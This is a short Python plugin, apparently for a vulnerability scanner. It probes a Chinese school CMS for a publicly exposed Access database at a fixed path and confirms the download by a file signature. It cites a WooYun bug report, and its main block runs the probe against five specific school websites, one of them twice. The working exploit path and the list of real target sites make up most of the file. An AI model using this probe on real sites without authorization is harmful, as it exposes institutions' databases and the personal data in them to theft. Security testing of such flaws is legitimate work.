#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:404
#Name:网域高校CMS数据库任意下载
#Refer:http://www.wooyun.org/bugs/wooyun-2010-067890

def assign(service,arg):
    if service=="wygxcms":
        return True,arg 
    


def  audit(arg):
    url=arg+"editor/db/%23%23%23wygk20012%23%23%23editor.mdb"
    code,head,res,errcode,_=curl.curl(url)
    if code==200 and "Standard Jet DB" in res:
        security_hole('file download Vulnerable:'+url)
        

if __name__=="__main__":
    from dummy import *
    audit(assign('wygxcms','http://www.dgdqgz.com/')[1])
    audit(assign('wygxcms','http://www.crxjy.net/')[1])
    audit(assign('wygxcms','http://www.gsjcx.net/')[1])
    audit(assign('wygxcms','http://4school.wrtx.cn/')[1])
    audit(assign('wygxcms','http://www.crxjy.net/')[1])